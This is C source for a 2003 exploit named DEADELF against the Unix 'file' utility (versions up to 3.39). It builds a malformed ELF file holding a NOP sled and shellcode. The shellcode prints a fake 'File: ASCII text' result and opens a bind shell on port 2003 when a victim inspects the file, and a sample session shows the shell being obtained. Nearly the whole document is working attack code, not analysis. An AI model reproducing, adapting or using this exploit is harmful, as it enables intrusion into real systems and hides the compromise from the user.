/*
\   __________________
/   Black Sand Project
\   __________________
/
\   Created by CrZ [crazy_einstein@yahoo.com] LimpidByte [lbyte.void.ru] /06.03.2003/
/
\   Bug discovered by iDEFENCE: http://www.idefense.com/advisory/03.04.03.txt
/   
\   program name: DEADELF
/
\   description: Exploit for file program <= 3.39
/
\   info: program create file-exploit and when you 
/   make "file /path/to/this/file-exploit" shell
\   will open on 2003 port.
/
\   Usage: ./85deadelf <file-exploit> [return address]
/
\   Example of work:
/
\	[crz@blacksand crz]$ gcc -o 85deadelf 85deadelf.c
/	[crz@blacksand crz]$ ./85deadelf deadelf
\	[+] Creating a evil file deadelf!
/	[+] Using address of shellcode = 0xbfffbd40
\	[crz@blacksand crz]$ file deadelf
/	File: ASCII text
\	[crz@blacksand crz]$ telnet localhost 2003
/	Trying 127.0.0.1...
\	Connected to blacksand (127.0.0.1).
/	Escape character is '^]'.
\	id;
/	uid=500(crz) gid=500(crz) groups=500(crz)
\	: command not found
/	exit;
\	Connection closed by foreign host.
/	[crz@blacksand crz]$
\
/   Tested against: file-3.37 (RedHat8.0)
\		    file-3.38 (RedHat8.0)
*/


#include <fcntl.h>
#include <elf.h>
#include <stdio.h>


void usage(char *prog) {

	printf("\nCreated by CrZ [crazy_einstein@yahoo.com] Limpid Byte [lbyte.void.ru]\n");
	printf("Usage: %s <name of evil file> [return address]\n\n",prog);
	exit(0);
}

int main(int argc, char **argv) {
	
/* 
\   a simple shellcode that show fake result of file program & bind
/   shell on 2003 port by CrZ
*/
	
char shellcode[]=
	"\x31\xc0\x31\xdb\x53\xb3\x01\x50" /* write(1,"File: ASCII text");*/
	"\x68\x01\x01\x0a\x0d\x68\x74\x65"
	"\x78\x74\x68\x43\x49\x49\x20\x68"
	"\x3a\x20\x41\x53\x68\x46\x69\x6c"
	"\x65\x89\xe1\xb2\x18\xb0\x04\xcd\x80"
        /* bind shell on 2003 port */
        "\x31\xc0\x89\xc3\xb0\x02\xcd\x80\x38\xc3\x74\x05\x8d\x43\x01\xcd\x80"
        "\x31\xc0\x89\x45\x10\x40\x89\xc3\x89\x45\x0c\x40\x89\x45\x08\x8d\x4d"
        "\x08\xb0\x66\xcd\x80\x89\x45\x08\x43\x66\x89\x5d\x14\x66\xc7\x45\x16"
        "\x07\xd3\x31\xd2\x89\x55\x18\x8d\x55\x14\x89\x55\x0c\xc6\x45\x10\x10"
        "\xb0\x66\xcd\x80\x40\x89\x45\x0c\x43\x43\xb0\x66\xcd\x80\x43\x89\x45"
        "\x0c\x89\x45\x10\xb0\x66\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41"
        "\x80\xf9\x03\x75\xf6\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
        "\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
	
	int fd,i;
	Elf32_Ehdr elfhdr;
	long xret=0xbfffbd40;
	char *evilfile="bl00mps";
	char tmp[100];
	
	if(!argv[1]) usage(argv[0]);
	else evilfile=argv[1];
	if(argv[2]) sscanf(argv[2],"0x%x",&xret);
	
	printf("[+] Creating a evil file %s!\n",evilfile);
	printf("[+] Using address of shellcode = 0x%x\n",xret);	
	
	sprintf(tmp,"echo>%s",evilfile);
	system(tmp);
	fd=open(evilfile,O_WRONLY);

	bzero(&elfhdr,sizeof elfhdr );
	elfhdr.e_type=1; //type should by NOT ET_CORE (4) & NOT ET_EXEC (2)
	sprintf(elfhdr.e_ident,"\x7f\x45\x4c\x46\x01\x01\x01"); //ELF32 FORMAT
	elfhdr.e_machine=1;
	elfhdr.e_version=1;
	elfhdr.e_entry=0;
	elfhdr.e_phoff=0;
	elfhdr.e_shoff=0;
	elfhdr.e_flags=0;
	elfhdr.e_ehsize=0;
	elfhdr.e_phentsize=0xfff; //define size for read()
	elfhdr.e_phnum=1; //this is for stop for() loop when read()
	elfhdr.e_shentsize=0xfff; //define size for read()
	elfhdr.e_shnum=1; //this is for stop for() loop when read()
	elfhdr.e_shstrndx=0;
	write(fd,&elfhdr,sizeof(elfhdr));
	
	for(i=0;i<20;i++) write(fd,&xret,4); //write new return address
	for(i=0;i<6000;i++) write(fd,"\x90",1); //write nops
	write(fd,&shellcode,sizeof shellcode); //write shellcode

	close(fd);

	
	return 0;	
}

